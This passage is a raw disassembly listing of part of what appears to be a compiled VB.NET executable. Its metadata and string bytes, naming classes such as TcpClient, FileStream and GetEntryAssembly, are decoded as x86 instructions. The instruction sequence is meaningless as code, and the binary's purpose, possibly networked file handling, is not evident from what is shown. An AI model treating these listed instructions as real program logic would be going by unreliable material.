  407aef:	00 43 01             	add    %al,0x1(%ebx)
  407af2:	3b 00                	cmp    (%eax),%eax
  407af4:	2d 13 02 00 43       	sub    $0x43000213,%eax
  407af9:	01 3d 00 47 13 04    	add    %edi,0x4134700
  407aff:	00 43 01             	add    %al,0x1(%ebx)
  407b02:	51                   	push   %ecx
  407b03:	00 cc                	add    %cl,%ah
  407b05:	13 01                	adc    (%ecx),%eax
  407b07:	00 43 01             	add    %al,0x1(%ebx)
  407b0a:	53                   	push   %ebx
  407b0b:	00 de                	add    %bl,%dh
  407b0d:	13 01                	adc    (%ecx),%eax
  407b0f:	00 46 01             	add    %al,0x1(%esi)
  407b12:	55                   	push   %ebp
  407b13:	00 f4                	add    %dh,%ah
  407b15:	13 02                	adc    (%edx),%eax
  407b17:	00 43 01             	add    %al,0x1(%ebx)
  407b1a:	57                   	push   %edi
  407b1b:	00 12                	add    %dl,(%edx)
  407b1d:	14 01                	adc    $0x1,%al
  407b1f:	00 43 01             	add    %al,0x1(%ebx)
  407b22:	59                   	pop    %ecx
  407b23:	00 4e 14             	add    %cl,0x14(%esi)
  407b26:	03 00                	add    (%eax),%eax
  407b28:	00 01                	add    %al,(%ecx)
  407b2a:	5b                   	pop    %ebx
  407b2b:	00 97 14 07 00 00    	add    %dl,0x714(%edi)
  407b31:	01 69 00             	add    %ebp,0x0(%ecx)
  407b34:	c5 14 06             	lds    (%esi,%eax,1),%edx
  407b37:	00 43 01             	add    %al,0x1(%ebx)
  407b3a:	83 00 7f             	addl   $0x7f,(%eax)
  407b3d:	15 01 00 43 01       	adc    $0x1430001,%eax
  407b42:	85 00                	test   %eax,(%eax)
  407b44:	92                   	xchg   %eax,%edx
  407b45:	15 01 00 00 01       	adc    $0x1000001,%eax
  407b4a:	87 00                	xchg   %eax,(%eax)
  407b4c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407b4d:	15 02 00 43 01       	adc    $0x1430002,%eax
  407b52:	89 00                	mov    %eax,(%eax)
  407b54:	b5 15                	mov    $0x15,%ch
  407b56:	02 00                	add    (%eax),%al
  407b58:	00 01                	add    %al,(%ecx)
  407b5a:	8b 00                	mov    (%eax),%eax
  407b5c:	ce                   	into
  407b5d:	15 02 00 00 01       	adc    $0x1000002,%eax
  407b62:	8d 00                	lea    (%eax),%eax
  407b64:	dc 15 02 00 00 01    	fcoml  0x1000002
  407b6a:	95                   	xchg   %eax,%ebp
  407b6b:	00 08                	add    %cl,(%eax)
  407b6d:	16                   	push   %ss
  407b6e:	02 00                	add    (%eax),%al
  407b70:	43                   	inc    %ebx
  407b71:	01 97 00 b5 15 02    	add    %edx,0x215b500(%edi)
  407b77:	00 43 01             	add    %al,0x1(%ebx)
  407b7a:	99                   	cltd
  407b7b:	00 08                	add    %cl,(%eax)
  407b7d:	12 02                	adc    (%edx),%al
  407b7f:	00 43 01             	add    %al,0x1(%ebx)
  407b82:	9b                   	fwait
  407b83:	00 38                	add    %bh,(%eax)
  407b85:	16                   	push   %ss
  407b86:	01 00                	add    %eax,(%eax)
  407b88:	43                   	inc    %ebx
  407b89:	01 9d 00 5c 16 01    	add    %ebx,0x1165c00(%ebp)
  407b8f:	00 46 01             	add    %al,0x1(%esi)
  407b92:	9f                   	lahf
  407b93:	00 e4                	add    %ah,%ah
  407b95:	12 02                	adc    (%edx),%al
  407b97:	00 46 01             	add    %al,0x1(%esi)
  407b9a:	a1 00 19 13 02       	mov    0x2131900,%eax
  407b9f:	00 43 01             	add    %al,0x1(%ebx)
  407ba2:	a3 00 82 16 01       	mov    %eax,0x1168200
  407ba7:	00 04 80             	add    %al,(%eax,%eax,4)
	...
  407bba:	60                   	pusha
  407bbb:	10 00                	adc    %al,(%eax)
  407bbd:	00 02                	add    %al,(%edx)
	...
  407bc7:	00 00                	add    %al,(%eax)
  407bc9:	00 13                	add    %dl,(%ebx)
  407bcb:	04 02                	add    $0x2,%al
  407bcd:	10 00                	adc    %al,(%eax)
  407bcf:	00 00                	add    %al,(%eax)
  407bd1:	00 08                	add    %cl,(%eax)
	...
  407bdb:	00 00                	add    %al,(%eax)
  407bdd:	00 1c 04             	add    %bl,(%esp,%eax,1)
  407be0:	d7                   	xlat   %ds:(%ebx)
  407be1:	01 00                	add    %eax,(%eax)
  407be3:	00 00                	add    %al,(%eax)
  407be5:	00 02                	add    %al,(%edx)
	...
  407bef:	00 00                	add    %al,(%eax)
  407bf1:	00 13                	add    %dl,(%ebx)
  407bf3:	04 8a                	add    $0x8a,%al
  407bf5:	01 00                	add    %eax,(%eax)
  407bf7:	00 00                	add    %al,(%eax)
  407bf9:	00 02                	add    %al,(%edx)
	...
  407c03:	00 00                	add    %al,(%eax)
  407c05:	00 13                	add    %dl,(%ebx)
  407c07:	04 2f                	add    $0x2f,%al
  407c09:	07                   	pop    %es
  407c0a:	00 00                	add    %al,(%eax)
  407c0c:	00 00                	add    %al,(%eax)
  407c0e:	02 00                	add    (%eax),%al
	...
  407c18:	00 00                	add    %al,(%eax)
  407c1a:	1c 04                	sbb    $0x4,%al
  407c1c:	70 07                	jo     0x407c25
  407c1e:	00 00                	add    %al,(%eax)
  407c20:	00 00                	add    %al,(%eax)
  407c22:	05 00 04 00 06       	add    $0x6000400,%eax
  407c27:	00 04 00             	add    %al,(%eax,%eax,1)
  407c2a:	0b 00                	or     (%eax),%eax
  407c2c:	0a 00                	or     (%eax),%al
  407c2e:	0c 00                	or     $0x0,%al
  407c30:	0a 00                	or     (%eax),%al
  407c32:	00 00                	add    %al,(%eax)
  407c34:	10 00                	adc    %al,(%eax)
  407c36:	0c 00                	or     $0x0,%al
  407c38:	5c                   	pop    %esp
  407c39:	10 00                	adc    %al,(%eax)
  407c3b:	00 10                	add    %dl,(%eax)
  407c3d:	00 19                	add    %bl,(%ecx)
  407c3f:	00 5c 10 00          	add    %bl,0x0(%eax,%edx,1)
  407c43:	00 00                	add    %al,(%eax)
  407c45:	00 1b                	add    %bl,(%ebx)
  407c47:	00 5c 10 23          	add    %bl,0x23(%eax,%edx,1)
  407c4b:	00 40 00             	add    %al,0x0(%eax)
  407c4e:	23 00                	and    (%eax),%eax
  407c50:	58                   	pop    %eax
  407c51:	00 00                	add    %al,(%eax)
  407c53:	00 00                	add    %al,(%eax)
  407c55:	3c 4d                	cmp    $0x4d,%al
  407c57:	6f                   	outsl  %ds:(%esi),(%dx)
  407c58:	64 75 6c             	fs jne 0x407cc7
  407c5b:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  407c60:	73 74                	jae    0x407cd6
  407c62:	65 6d                	gs insl (%dx),%es:(%edi)
  407c64:	2e 52                	cs push %edx
  407c66:	75 6e                	jne    0x407cd6
  407c68:	74 69                	je     0x407cd3
  407c6a:	6d                   	insl   (%dx),%es:(%edi)
  407c6b:	65 2e 43             	gs cs inc %ebx
  407c6e:	6f                   	outsl  %ds:(%esi),(%dx)
  407c6f:	6d                   	insl   (%dx),%es:(%edi)
  407c70:	70 69                	jo     0x407cdb
  407c72:	6c                   	insb   (%dx),%es:(%edi)
  407c73:	65 72 53             	gs jb  0x407cc9
  407c76:	65 72 76             	gs jb  0x407cef
  407c79:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  407c80:	6d                   	insl   (%dx),%es:(%edi)
  407c81:	70 69                	jo     0x407cec
  407c83:	6c                   	insb   (%dx),%es:(%edi)
  407c84:	61                   	popa
  407c85:	74 69                	je     0x407cf0
  407c87:	6f                   	outsl  %ds:(%esi),(%dx)
  407c88:	6e                   	outsb  %ds:(%esi),(%dx)
  407c89:	52                   	push   %edx
  407c8a:	65 6c                	gs insb (%dx),%es:(%edi)
  407c8c:	61                   	popa
  407c8d:	78 61                	js     0x407cf0
  407c8f:	74 69                	je     0x407cfa
  407c91:	6f                   	outsl  %ds:(%esi),(%dx)
  407c92:	6e                   	outsb  %ds:(%esi),(%dx)
  407c93:	73 41                	jae    0x407cd6
  407c95:	74 74                	je     0x407d0b
  407c97:	72 69                	jb     0x407d02
  407c99:	62 75 74             	bound  %esi,0x74(%ebp)
  407c9c:	65 00 2e             	add    %ch,%gs:(%esi)
  407c9f:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  407ca3:	00 52 75             	add    %dl,0x75(%edx)
  407ca6:	6e                   	outsb  %ds:(%esi),(%dx)
  407ca7:	74 69                	je     0x407d12
  407ca9:	6d                   	insl   (%dx),%es:(%edi)
  407caa:	65 43                	gs inc %ebx
  407cac:	6f                   	outsl  %ds:(%esi),(%dx)
  407cad:	6d                   	insl   (%dx),%es:(%edi)
  407cae:	70 61                	jo     0x407d11
  407cb0:	74 69                	je     0x407d1b
  407cb2:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  407cb5:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  407cbc:	69 
  407cbd:	62 75 74             	bound  %esi,0x74(%ebp)
  407cc0:	65 00 4d 69          	add    %cl,%gs:0x69(%ebp)
  407cc4:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407cc7:	73 6f                	jae    0x407d38
  407cc9:	66 74 2e             	data16 je 0x407cfa
  407ccc:	56                   	push   %esi
  407ccd:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407cd4:	73 69                	jae    0x407d3f
  407cd6:	63 2e                	arpl   %ebp,(%esi)
  407cd8:	41                   	inc    %ecx
  407cd9:	70 70                	jo     0x407d4b
  407cdb:	6c                   	insb   (%dx),%es:(%edi)
  407cdc:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407ce3:	53                   	push   %ebx
  407ce4:	65 72 76             	gs jb  0x407d5d
  407ce7:	69 63 65 73 00 41 70 	imul   $0x70410073,0x65(%ebx),%esp
  407cee:	70 6c                	jo     0x407d5c
  407cf0:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407cf7:	42                   	inc    %edx
  407cf8:	61                   	popa
  407cf9:	73 65                	jae    0x407d60
  407cfb:	00 53 79             	add    %dl,0x79(%ebx)
  407cfe:	73 74                	jae    0x407d74
  407d00:	65 6d                	gs insl (%dx),%es:(%edi)
  407d02:	2e 43                	cs inc %ebx
  407d04:	6f                   	outsl  %ds:(%esi),(%dx)
  407d05:	6d                   	insl   (%dx),%es:(%edi)
  407d06:	70 6f                	jo     0x407d77
  407d08:	6e                   	outsb  %ds:(%esi),(%dx)
  407d09:	65 6e                	outsb  %gs:(%esi),(%dx)
  407d0b:	74 4d                	je     0x407d5a
  407d0d:	6f                   	outsl  %ds:(%esi),(%dx)
  407d0e:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  407d11:	00 45 64             	add    %al,0x64(%ebp)
  407d14:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  407d1b:	77 
  407d1c:	73 61                	jae    0x407d7f
  407d1e:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  407d22:	74 74                	je     0x407d98
  407d24:	72 69                	jb     0x407d8f
  407d26:	62 75 74             	bound  %esi,0x74(%ebp)
  407d29:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  407d2d:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  407d34:	77 
  407d35:	73 61                	jae    0x407d98
  407d37:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  407d3b:	74 61                	je     0x407d9e
  407d3d:	74 65                	je     0x407da4
  407d3f:	00 53 79             	add    %dl,0x79(%ebx)
  407d42:	73 74                	jae    0x407db8
  407d44:	65 6d                	gs insl (%dx),%es:(%edi)
  407d46:	2e 43                	cs inc %ebx
  407d48:	6f                   	outsl  %ds:(%esi),(%dx)
  407d49:	64 65 44             	fs gs inc %esp
  407d4c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d4d:	6d                   	insl   (%dx),%es:(%edi)
  407d4e:	2e 43                	cs inc %ebx
  407d50:	6f                   	outsl  %ds:(%esi),(%dx)
  407d51:	6d                   	insl   (%dx),%es:(%edi)
  407d52:	70 69                	jo     0x407dbd
  407d54:	6c                   	insb   (%dx),%es:(%edi)
  407d55:	65 72 00             	gs jb  0x407d58
  407d58:	47                   	inc    %edi
  407d59:	65 6e                	outsb  %gs:(%esi),(%dx)
  407d5b:	65 72 61             	gs jb  0x407dbf
  407d5e:	74 65                	je     0x407dc5
  407d60:	64 43                	fs inc %ebx
  407d62:	6f                   	outsl  %ds:(%esi),(%dx)
  407d63:	64 65 41             	fs gs inc %ecx
  407d66:	74 74                	je     0x407ddc
  407d68:	72 69                	jb     0x407dd3
  407d6a:	62 75 74             	bound  %esi,0x74(%ebp)
  407d6d:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407d71:	73 74                	jae    0x407de7
  407d73:	65 6d                	gs insl (%dx),%es:(%edi)
  407d75:	2e 44                	cs inc %esp
  407d77:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  407d7e:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  407d85:	75 67                	jne    0x407dee
  407d87:	67 65 72 4e          	addr16 gs jb 0x407dd9
  407d8b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d8c:	6e                   	outsb  %ds:(%esi),(%dx)
  407d8d:	55                   	push   %ebp
  407d8e:	73 65                	jae    0x407df5
  407d90:	72 43                	jb     0x407dd5
  407d92:	6f                   	outsl  %ds:(%esi),(%dx)
  407d93:	64 65 41             	fs gs inc %ecx
  407d96:	74 74                	je     0x407e0c
  407d98:	72 69                	jb     0x407e03
  407d9a:	62 75 74             	bound  %esi,0x74(%ebp)
  407d9d:	65 00 4d 69          	add    %cl,%gs:0x69(%ebp)
  407da1:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407da4:	73 6f                	jae    0x407e15
  407da6:	66 74 2e             	data16 je 0x407dd7
  407da9:	56                   	push   %esi
  407daa:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407db1:	73 69                	jae    0x407e1c
  407db3:	63 2e                	arpl   %ebp,(%esi)
  407db5:	44                   	inc    %esp
  407db6:	65 76 69             	gs jbe 0x407e22
  407db9:	63 65 73             	arpl   %esp,0x73(%ebp)
  407dbc:	00 43 6f             	add    %al,0x6f(%ebx)
  407dbf:	6d                   	insl   (%dx),%es:(%edi)
  407dc0:	70 75                	jo     0x407e37
  407dc2:	74 65                	je     0x407e29
  407dc4:	72 00                	jb     0x407dc6
  407dc6:	44                   	inc    %esp
  407dc7:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407dcb:	67 65 72 48          	addr16 gs jb 0x407e17
  407dcf:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  407dd6:	74 
  407dd7:	72 69                	jb     0x407e42
  407dd9:	62 75 74             	bound  %esi,0x74(%ebp)
  407ddc:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407de0:	73 74                	jae    0x407e56
  407de2:	65 6d                	gs insl (%dx),%es:(%edi)
  407de4:	00 4f 62             	add    %cl,0x62(%edi)
  407de7:	6a 65                	push   $0x65
  407de9:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  407ded:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407df4:	74 2e                	je     0x407e24
  407df6:	56                   	push   %esi
  407df7:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407dfe:	73 69                	jae    0x407e69
  407e00:	63 2e                	arpl   %ebp,(%esi)
  407e02:	43                   	inc    %ebx
  407e03:	6f                   	outsl  %ds:(%esi),(%dx)
  407e04:	6d                   	insl   (%dx),%es:(%edi)
  407e05:	70 69                	jo     0x407e70
  407e07:	6c                   	insb   (%dx),%es:(%edi)
  407e08:	65 72 53             	gs jb  0x407e5e
  407e0b:	65 72 76             	gs jb  0x407e84
  407e0e:	69 63 65 73 00 53 74 	imul   $0x74530073,0x65(%ebx),%esp
  407e15:	61                   	popa
  407e16:	6e                   	outsb  %ds:(%esi),(%dx)
  407e17:	64 61                	fs popa
  407e19:	72 64                	jb     0x407e7f
  407e1b:	4d                   	dec    %ebp
  407e1c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e1d:	64 75 6c             	fs jne 0x407e8c
  407e20:	65 41                	gs inc %ecx
  407e22:	74 74                	je     0x407e98
  407e24:	72 69                	jb     0x407e8f
  407e26:	62 75 74             	bound  %esi,0x74(%ebp)
  407e29:	65 00 4d 69          	add    %cl,%gs:0x69(%ebp)
  407e2d:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407e30:	73 6f                	jae    0x407ea1
  407e32:	66 74 2e             	data16 je 0x407e63
  407e35:	56                   	push   %esi
  407e36:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407e3d:	73 69                	jae    0x407ea8
  407e3f:	63 00                	arpl   %eax,(%eax)
  407e41:	48                   	dec    %eax
  407e42:	69 64 65 4d 6f 64 75 	imul   $0x6c75646f,0x4d(%ebp,%eiz,2),%esp
  407e49:	6c 
  407e4a:	65 4e                	gs dec %esi
  407e4c:	61                   	popa
  407e4d:	6d                   	insl   (%dx),%es:(%edi)
  407e4e:	65 41                	gs inc %ecx
  407e50:	74 74                	je     0x407ec6
  407e52:	72 69                	jb     0x407ebd
  407e54:	62 75 74             	bound  %esi,0x74(%ebp)
  407e57:	65 00 4d 79          	add    %cl,%gs:0x79(%ebp)
  407e5b:	47                   	inc    %edi
  407e5c:	72 6f                	jb     0x407ecd
  407e5e:	75 70                	jne    0x407ed0
  407e60:	43                   	inc    %ebx
  407e61:	6f                   	outsl  %ds:(%esi),(%dx)
  407e62:	6c                   	insb   (%dx),%es:(%edi)
  407e63:	6c                   	insb   (%dx),%es:(%edi)
  407e64:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407e69:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6a:	41                   	inc    %ecx
  407e6b:	74 74                	je     0x407ee1
  407e6d:	72 69                	jb     0x407ed8
  407e6f:	62 75 74             	bound  %esi,0x74(%ebp)
  407e72:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e76:	6e                   	outsb  %ds:(%esi),(%dx)
  407e77:	74 69                	je     0x407ee2
  407e79:	6d                   	insl   (%dx),%es:(%edi)
  407e7a:	65 48                	gs dec %eax
  407e7c:	65 6c                	gs insb (%dx),%es:(%edi)
  407e7e:	70 65                	jo     0x407ee5
  407e80:	72 73                	jb     0x407ef5
  407e82:	00 47 65             	add    %al,0x65(%edi)
  407e85:	74 4f                	je     0x407ed6
  407e87:	62 6a 65             	bound  %ebp,0x65(%edx)
  407e8a:	63 74 56 61          	arpl   %esi,0x61(%esi,%edx,2)
  407e8e:	6c                   	insb   (%dx),%es:(%edi)
  407e8f:	75 65                	jne    0x407ef6
  407e91:	00 45 71             	add    %al,0x71(%ebp)
  407e94:	75 61                	jne    0x407ef7
  407e96:	6c                   	insb   (%dx),%es:(%edi)
  407e97:	73 00                	jae    0x407e99
  407e99:	47                   	inc    %edi
  407e9a:	65 74 48             	gs je  0x407ee5
  407e9d:	61                   	popa
  407e9e:	73 68                	jae    0x407f08
  407ea0:	43                   	inc    %ebx
  407ea1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea2:	64 65 00 54 79 70    	fs add %dl,%gs:0x70(%ecx,%edi,2)
  407ea8:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407eac:	6e                   	outsb  %ds:(%esi),(%dx)
  407ead:	74 69                	je     0x407f18
  407eaf:	6d                   	insl   (%dx),%es:(%edi)
  407eb0:	65 54                	gs push %esp
  407eb2:	79 70                	jns    0x407f24
  407eb4:	65 48                	gs dec %eax
  407eb6:	61                   	popa
  407eb7:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb8:	64 6c                	fs insb (%dx),%es:(%edi)
  407eba:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407ebe:	74 54                	je     0x407f14
  407ec0:	79 70                	jns    0x407f32
  407ec2:	65 46                	gs inc %esi
  407ec4:	72 6f                	jb     0x407f35
  407ec6:	6d                   	insl   (%dx),%es:(%edi)
  407ec7:	48                   	dec    %eax
  407ec8:	61                   	popa
  407ec9:	6e                   	outsb  %ds:(%esi),(%dx)
  407eca:	64 6c                	fs insb (%dx),%es:(%edi)
  407ecc:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407ed1:	74 72                	je     0x407f45
  407ed3:	69 6e 67 00 41 63 74 	imul   $0x74634100,0x67(%esi),%ebp
  407eda:	69 76 61 74 6f 72 00 	imul   $0x726f74,0x61(%esi),%esi
  407ee1:	43                   	inc    %ebx
  407ee2:	72 65                	jb     0x407f49
  407ee4:	61                   	popa
  407ee5:	74 65                	je     0x407f4c
  407ee7:	49                   	dec    %ecx
  407ee8:	6e                   	outsb  %ds:(%esi),(%dx)
  407ee9:	73 74                	jae    0x407f5f
  407eeb:	61                   	popa
  407eec:	6e                   	outsb  %ds:(%esi),(%dx)
  407eed:	63 65 00             	arpl   %esp,0x0(%ebp)
  407ef0:	53                   	push   %ebx
  407ef1:	79 73                	jns    0x407f66
  407ef3:	74 65                	je     0x407f5a
  407ef5:	6d                   	insl   (%dx),%es:(%edi)
  407ef6:	2e 52                	cs push %edx
  407ef8:	75 6e                	jne    0x407f68
  407efa:	74 69                	je     0x407f65
  407efc:	6d                   	insl   (%dx),%es:(%edi)
  407efd:	65 2e 49             	gs cs dec %ecx
  407f00:	6e                   	outsb  %ds:(%esi),(%dx)
  407f01:	74 65                	je     0x407f68
  407f03:	72 6f                	jb     0x407f74
  407f05:	70 53                	jo     0x407f5a
  407f07:	65 72 76             	gs jb  0x407f80
  407f0a:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  407f11:	6d                   	insl   (%dx),%es:(%edi)
  407f12:	56                   	push   %esi
  407f13:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  407f1a:	74 74                	je     0x407f90
  407f1c:	72 69                	jb     0x407f87
  407f1e:	62 75 74             	bound  %esi,0x74(%ebp)
  407f21:	65 00 54 68 72       	add    %dl,%gs:0x72(%eax,%ebp,2)
  407f26:	65 61                	gs popa
  407f28:	64 53                	fs push %ebx
  407f2a:	74 61                	je     0x407f8d
  407f2c:	74 69                	je     0x407f97
  407f2e:	63 41 74             	arpl   %eax,0x74(%ecx)
  407f31:	74 72                	je     0x407fa5
  407f33:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  407f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  407f3b:	6d                   	insl   (%dx),%es:(%edi)
  407f3c:	70 69                	jo     0x407fa7
  407f3e:	6c                   	insb   (%dx),%es:(%edi)
  407f3f:	65 72 47             	gs jb  0x407f89
  407f42:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f44:	65 72 61             	gs jb  0x407fa8
  407f47:	74 65                	je     0x407fae
  407f49:	64 41                	fs inc %ecx
  407f4b:	74 74                	je     0x407fc1
  407f4d:	72 69                	jb     0x407fb8
  407f4f:	62 75 74             	bound  %esi,0x74(%ebp)
  407f52:	65 00 6d 5f          	add    %ch,%gs:0x5f(%ebp)
  407f56:	54                   	push   %esp
  407f57:	68 72 65 61 64       	push   $0x64616572
  407f5c:	53                   	push   %ebx
  407f5d:	74 61                	je     0x407fc0
  407f5f:	74 69                	je     0x407fca
  407f61:	63 56 61             	arpl   %edx,0x61(%esi)
  407f64:	6c                   	insb   (%dx),%es:(%edi)
  407f65:	75 65                	jne    0x407fcc
  407f67:	00 55 73             	add    %dl,0x73(%ebp)
  407f6a:	65 72 00             	gs jb  0x407f6d
  407f6d:	67 65 74 5f          	addr16 gs je 0x407fd0
  407f71:	47                   	inc    %edi
  407f72:	65 74 49             	gs je  0x407fbe
  407f75:	6e                   	outsb  %ds:(%esi),(%dx)
  407f76:	73 74                	jae    0x407fec
  407f78:	61                   	popa
  407f79:	6e                   	outsb  %ds:(%esi),(%dx)
  407f7a:	63 65 00             	arpl   %esp,0x0(%ebp)
  407f7d:	53                   	push   %ebx
  407f7e:	79 73                	jns    0x407ff3
  407f80:	74 65                	je     0x407fe7
  407f82:	6d                   	insl   (%dx),%es:(%edi)
  407f83:	2e 43                	cs inc %ebx
  407f85:	6f                   	outsl  %ds:(%esi),(%dx)
  407f86:	6d                   	insl   (%dx),%es:(%edi)
  407f87:	70 6f                	jo     0x407ff8
  407f89:	6e                   	outsb  %ds:(%esi),(%dx)
  407f8a:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f8c:	74 4d                	je     0x407fdb
  407f8e:	6f                   	outsl  %ds:(%esi),(%dx)
  407f8f:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  407f92:	2e 44                	cs inc %esp
  407f94:	65 73 69             	gs jae 0x408000
  407f97:	67 6e                	outsb  %ds:(%si),(%dx)
  407f99:	00 48 65             	add    %cl,0x65(%eax)
  407f9c:	6c                   	insb   (%dx),%es:(%edi)
  407f9d:	70 4b                	jo     0x407fea
  407f9f:	65 79 77             	gs jns 0x408019
  407fa2:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa3:	72 64                	jb     0x408009
  407fa5:	41                   	inc    %ecx
  407fa6:	74 74                	je     0x40801c
  407fa8:	72 69                	jb     0x408013
  407faa:	62 75 74             	bound  %esi,0x74(%ebp)
  407fad:	65 00 53 54          	add    %dl,%gs:0x54(%ebx)
  407fb1:	41                   	inc    %ecx
  407fb2:	54                   	push   %esp
  407fb3:	68 72 65 61 64       	push   $0x64616572
  407fb8:	41                   	inc    %ecx
  407fb9:	74 74                	je     0x40802f
  407fbb:	72 69                	jb     0x408026
  407fbd:	62 75 74             	bound  %esi,0x74(%ebp)
  407fc0:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407fc4:	73 74                	jae    0x40803a
  407fc6:	65 6d                	gs insl (%dx),%es:(%edi)
  407fc8:	2e 4e                	cs dec %esi
  407fca:	65 74 2e             	gs je  0x407ffb
  407fcd:	53                   	push   %ebx
  407fce:	6f                   	outsl  %ds:(%esi),(%dx)
  407fcf:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407fd2:	74 73                	je     0x408047
  407fd4:	00 54 63 70          	add    %dl,0x70(%ebx,%eiz,2)
  407fd8:	43                   	inc    %ebx
  407fd9:	6c                   	insb   (%dx),%es:(%edi)
  407fda:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  407fe1:	73 74                	jae    0x408057
  407fe3:	65 6d                	gs insl (%dx),%es:(%edi)
  407fe5:	2e 49                	cs dec %ecx
  407fe7:	4f                   	dec    %edi
  407fe8:	00 46 69             	add    %al,0x69(%esi)
  407feb:	6c                   	insb   (%dx),%es:(%edi)
  407fec:	65 53                	gs push %ebx
  407fee:	74 72                	je     0x408062
  407ff0:	65 61                	gs popa
  407ff2:	6d                   	insl   (%dx),%es:(%edi)
  407ff3:	00 46 69             	add    %al,0x69(%esi)
  407ff6:	6c                   	insb   (%dx),%es:(%edi)
  407ff7:	65 49                	gs dec %ecx
  407ff9:	6e                   	outsb  %ds:(%esi),(%dx)
  407ffa:	66 6f                	outsw  %ds:(%esi),(%dx)
  407ffc:	00 4d 65             	add    %cl,0x65(%ebp)
  407fff:	6d                   	insl   (%dx),%es:(%edi)
  408000:	6f                   	outsl  %ds:(%esi),(%dx)
  408001:	72 79                	jb     0x40807c
  408003:	53                   	push   %ebx
  408004:	74 72                	je     0x408078
  408006:	65 61                	gs popa
  408008:	6d                   	insl   (%dx),%es:(%edi)
  408009:	00 42 79             	add    %al,0x79(%edx)
  40800c:	74 65                	je     0x408073
  40800e:	00 43 6f             	add    %al,0x6f(%ebx)
  408011:	6e                   	outsb  %ds:(%esi),(%dx)
  408012:	76 65                	jbe    0x408079
  408014:	72 73                	jb     0x408089
  408016:	69 6f 6e 73 00 54 6f 	imul   $0x6f540073,0x6e(%edi),%ebp
  40801d:	42                   	inc    %edx
  40801e:	6f                   	outsl  %ds:(%esi),(%dx)
  40801f:	6f                   	outsl  %ds:(%esi),(%dx)
  408020:	6c                   	insb   (%dx),%es:(%edi)
  408021:	65 61                	gs popa
  408023:	6e                   	outsb  %ds:(%esi),(%dx)
  408024:	00 53 79             	add    %dl,0x79(%ebx)
  408027:	73 74                	jae    0x40809d
  408029:	65 6d                	gs insl (%dx),%es:(%edi)
  40802b:	2e 52                	cs push %edx
  40802d:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408030:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408035:	6e                   	outsb  %ds:(%esi),(%dx)
  408036:	00 41 73             	add    %al,0x73(%ecx)
  408039:	73 65                	jae    0x4080a0
  40803b:	6d                   	insl   (%dx),%es:(%edi)
  40803c:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  408040:	47                   	inc    %edi
  408041:	65 74 45             	gs je  0x408089
  408044:	6e                   	outsb  %ds:(%esi),(%dx)
  408045:	74 72                	je     0x4080b9
  408047:	79 41                	jns    0x40808a
  408049:	73 73                	jae    0x4080be
  40804b:	65 6d                	gs insl (%dx),%es:(%edi)
  40804d:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  408051:	67 65 74 5f          	addr16 gs je 0x4080b4
  408055:	4c                   	dec    %esp
  408056:	6f                   	outsl  %ds:(%esi),(%dx)
  408057:	63 61 74             	arpl   %esp,0x74(%ecx)
  40805a:	69 6f 6e 00 4d 69 63 	imul   $0x63694d00,0x6e(%edi),%ebp
